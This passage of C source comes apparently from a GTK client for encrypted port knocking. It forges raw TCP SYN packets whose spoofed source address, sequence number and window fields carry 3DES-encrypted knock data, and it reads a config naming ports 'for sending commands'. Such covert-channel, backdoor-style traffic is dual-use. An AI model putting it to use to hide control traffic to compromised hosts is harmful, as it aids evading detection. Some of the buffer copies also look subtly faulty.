    int i;
    int p;
    
    for(i=0;i<len;i++)
    {
        p = *(str+i);
        if(!isdigit(p)) return 0;
    }
    return 1;
}

/****************************************************************************
Function    :  on_knock_button_clicked
REVISIONS   :  
Parameters  :  
Description :  Receiving port knocking
Returns     :  None
****************************************************************************/
void on_knock_button_clicked(GtkWidget *button)
{
    struct Auth_buffer  packet;                // Knocking packet
    struct knocking     knock;                 // Knocking info    
    struct pseudo_header_tcp   pseudo_header;  // Pseudo packets
    GtkTextIter end;
    GtkWidget *dialog, *label, *txtPass;
    gint result;
    char password[9], *pw, t[2], tt[6];
    int portNum;
    int duraNum;
    unsigned char hour, minute, second, desbuf[8], tmp[8];
    unsigned short check;
    struct sockaddr_in sin;
    int on = 1;
    int send_socket;
    int temp ;
    
    // Get the knocking info
    const char* port = gtk_entry_get_text(GTK_ENTRY(txtPortNumber));
    const char* time = gtk_entry_get_text(GTK_ENTRY(txtTime));
    const char* dura = gtk_entry_get_text(GTK_ENTRY(txtDur));
    const char* src  = gtk_entry_get_text(GTK_ENTRY(txtSrc));
    const char* dst = gtk_entry_get_text(GTK_ENTRY(txtDest));
    
    // Is the knocking info valid?
    if( port == NULL || time == NULL || dura == NULL || src == NULL ||
        strlen(port) == 0 || strlen(time) == 0 || strlen(dura) == 0 || strlen(src) == 0 ||
        (!gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(chkUdp)) &&
        !gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(chkTcp)))){
            gtk_text_buffer_insert_at_cursor(buffer,"Please don't leave any field blank.\n", 36);
            gtk_text_buffer_get_end_iter(buffer, &end);
            gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
            return;
    }

    if(strlen(time) != 8 || *(time+2) != ':' || *(time+5) != ':') {
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid time format.\n", 21);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    bzero(t,2);
    bcopy(time,t,2);
    hour = (unsigned char)atoi(t);
    bzero(t,2);
    bcopy(time+3,t,2);
    minute = (unsigned char)atoi(t);
    bzero(t,2);
    bcopy(time+6,t,2);
    second = (unsigned char)atoi(t);
    
    if(hour >= 24 || minute >= 60 || second >= 60) {
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid time value.\n", 20);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    bzero(tt,6);
    temp = strlen(port);
    if(temp > 5) temp = 5;
    bcopy(port,tt,temp);
    portNum = atoi(tt);
    bzero(tt,6);
    temp = strlen(dura);
    if(temp > 5) temp = 5;
    bcopy(dura,tt,temp);
    duraNum = atoi(tt);

    // Forge the knocking info and encrypt it using 3-des algorithm
    knock.checksum    = 0;
    knock.port        = portNum;
    knock.time.hour   = hour;
    knock.time.minute = minute;
    knock.time.second = second;
    knock.time.dur    = duraNum;
    knock.sip = host_convert((char *)src);
    
    check = in_cksum((unsigned short *)&knock, sizeof(struct knocking));
    knock.checksum    = check;

    if(!isDigit((char *)port, strlen(port)) || !isDigit((char *)dura, strlen(dura)) ||
       !isDigit((char *)time, 2) || !isDigit((char *)time+3, 2) || !isDigit((char *)time+6,2)){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid data format.\n", 21);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    if(portNum <= 0 || portNum > 65535 || duraNum <= 0 || duraNum > 32767){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid port number or duration value.\n", 39);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }

    if(gethostbyname(src) == NULL){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid source IP.\n", 19);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    if(gethostbyname(dst) == NULL){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid destination IP.\n", 24);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }

    // Create a dialogbox to get the knocking password
    dialog = gtk_dialog_new_with_buttons ("Password",
                                         GTK_WINDOW(window),
                                         GTK_DIALOG_DESTROY_WITH_PARENT,
                                         GTK_STOCK_OK,
                                         GTK_RESPONSE_OK,
                                         GTK_STOCK_CANCEL,
                                         GTK_RESPONSE_CANCEL,
                                         NULL);
                                         
    label = gtk_label_new ("Knocking password:\n(Maximum length = 8)\n");
    gtk_container_add (GTK_CONTAINER (GTK_DIALOG(dialog)->vbox), label);
    txtPass = gtk_entry_new();
    gtk_container_add (GTK_CONTAINER (GTK_DIALOG(dialog)->vbox), txtPass);
    gtk_entry_set_visibility(GTK_ENTRY(txtPass), FALSE);
    gtk_entry_set_invisible_char(GTK_ENTRY(txtPass), 42);
    
    gtk_widget_show_all (dialog);
    
    result = gtk_dialog_run (GTK_DIALOG (dialog));

    switch (result)
    {
      case GTK_RESPONSE_OK:
         pw = (char *)gtk_entry_get_text(GTK_ENTRY(txtPass));
         bzero(password,9);
         if(strlen(pw) < 8) strncpy(password, pw, strlen(pw));
         else strncpy(password, pw, 8);
         break;
      case GTK_RESPONSE_CANCEL:
         gtk_widget_destroy (txtPass);
         gtk_widget_destroy (label);
         gtk_widget_destroy (dialog);
         gtk_text_buffer_insert_at_cursor(buffer,"Canceled by user.\n", 18);
         gtk_text_buffer_get_end_iter(buffer, &end);
         gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
         return;
         break;         
      default:
         return;
         break;
    }
    
    // Destroy the dialog box
    gtk_widget_destroy (txtPass);
    gtk_widget_destroy (label);
    gtk_widget_destroy (dialog);
    
    // Check the password
    if(strlen(password) <= 0){
        gtk_text_buffer_insert_at_cursor(buffer,"Invalid password.\n", 18);
        gtk_text_buffer_get_end_iter(buffer, &end);
        gtk_text_view_scroll_to_iter(GTK_TEXT_VIEW(text_view),&end,0.0,1,0.0,1.0);
        return;
    }
    
    bzero(desbuf,8);
    T_DES((unsigned char *)&knock, desbuf, (unsigned char *)&password, 1);
    bcopy(desbuf, (unsigned char *)&knock, 8);
    bzero(desbuf,8);
    bzero(tmp,8);
    bcopy((unsigned char *)(&knock+8),tmp, 4);
    T_DES(tmp, desbuf, (unsigned char *)&password, 1);
    bcopy(desbuf, (unsigned char *)(&knock+8), 4);
    
    // Forge IP header
    packet.IPHeader.ihl      = 5;
    packet.IPHeader.version  = 4;
    packet.IPHeader.tos      = 0;
    packet.IPHeader.tot_len  = htons(40);
    packet.IPHeader.id       = knock.checksum; 
    packet.IPHeader.frag_off = 0x0000;
    packet.IPHeader.ttl      = 128;
    packet.IPHeader.protocol = IPPROTO_TCP;
    packet.IPHeader.check    = 0;

    bcopy((char *)&(knock.time), (char *)&(packet.IPHeader.saddr), 32);
    packet.IPHeader.daddr    = host_convert((char *)dst);
    packet.IPHeader.check    = in_cksum((unsigned short *)&packet.IPHeader, 20);
    
    // Forge TCP header
    packet.TCPHeader.dest    = htons(DPORT_KNOCK);
    packet.TCPHeader.source  = htons(SPORT_KNOCK);
    
    bcopy((char *)&(knock.time), (char *)&(packet.TCPHeader.seq), 32);
    packet.TCPHeader.ack_seq = host_convert((char *)src);
       	
    packet.TCPHeader.doff    = 5;
    packet.TCPHeader.fin     = 0;
    packet.TCPHeader.syn     = 1;
    packet.TCPHeader.rst     = 0;
    packet.TCPHeader.psh     = 0;
    packet.TCPHeader.ack     = 0;
    packet.TCPHeader.urg     = 0;
    packet.TCPHeader.ece     = 0;
    packet.TCPHeader.cwr     = 0;
    packet.TCPHeader.window  = htons(knock.port);
    packet.TCPHeader.check   = 0;
    packet.TCPHeader.urg_ptr = 0;

    packet.TCPHeader.res1    = 0;
    if(gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(chkTcp)))
       packet.TCPHeader.res1 += 8;
    if(gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(chkUdp)))
       packet.TCPHeader.res1 += 2;

    // Forge pseudo header and calculate the tcp checksum
    pseudo_header.source_address = packet.IPHeader.saddr;
    pseudo_header.dest_address = packet.IPHeader.daddr;
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(20);
    bcopy((char *)&packet.TCPHeader, (char *)&pseudo_header.tcp, 20);
    packet.TCPHeader.check = in_cksum((unsigned short *)&pseudo_header, 32);
    
    /* Drop our forged data into the socket struct */
    sin.sin_family = AF_INET;
    sin.sin_port = packet.TCPHeader.source;
    sin.sin_addr.s_addr = packet.IPHeader.daddr; 
    
    send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    setsockopt(send_socket, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    sendto(send_socket, &packet, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
    close(send_socket);
    return;
}
//
// Because GTK returns a dirty string, so
// Clean up the dirty thing
// Just forget about these two functions
// 
void purifyIP(char *buf)
{
    int i;

    for(i = 15; i >= 0; i--){
        if(!isdigit(buf[i]) && buf[i] != '.') buf[i] = 0;
    }
}
// Clean up the dirty thing
void purifyPort(char *buf)
{
    int i;

    for(i = 15; i >= 0; i--){
        if(!isdigit(buf[i])) buf[i] = 0;
    }
}

/****************************************************************************
Function    :  config
REVISIONS   :  
Parameters  :  
Description :  read the config file
Returns     :  None
****************************************************************************/
void config(void)
{
    FILE *file;
    unsigned long FileLength;
    char str[22], txt[16];
    
    file = fopen(CONFIGFILE,"r");
    if(file==NULL){
        perror("Error: config() : fopen() : ");
        exit(-1);
    }
    if(fseek(file,0,SEEK_END)==-1)
    {
        perror("Error: config() : fseek() : ");
        exit(-1);
    }
    FileLength = ftell(file);
    if(FileLength == 0 || FileLength == -1){
        perror("Error: config() : ftell() : ");
        exit(-1);
    }
    rewind(file);
    while(ftell(file) < FileLength){
        bzero(str,22);
        bzero(txt,16);
        fgets(str,22,file);
        
        if(str[0] == '#') continue;     // Skip all comments
        
        if(!strncmp("src = ", str, 6)){    // Source IP address
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyIP(txt);
            gtk_entry_set_text(GTK_ENTRY(txtSrc), txt);
            continue;
        }
        
        if(!strncmp("dst = ", str, 6)){   // Destination IP address
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyIP(txt);
            gtk_entry_set_text(GTK_ENTRY(txtDest), txt);
            continue;
        }
        
        if(!strncmp("spt = ", str, 6)){   // Source udp port for sending commands
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            SOURCE_PORT = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("dpt = ", str, 6)){   // Destination udp port for sending commands
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            DEST_PORT = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("spk = ", str, 6)){   // source port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            SPORT_KNOCK = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("dpk = ", str, 6)){   // Destination port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            DPORT_KNOCK = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("sap = ", str, 6)){   // Destination port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            P_AUTH = (short)atoi(txt);
            continue;
        }
        
        if(!strncmp("dap = ", str, 6)){   // Destination port number used for knocking
            strncpy(txt, &(str[6]), strlen(&(str[6])));
            purifyPort(txt);
            D_AUTH = (short)atoi(txt);
            continue;
        }
    }
    if(fclose(file)){
        perror("Error: config() : fclose() : ");
        exit(-1);
    }
}
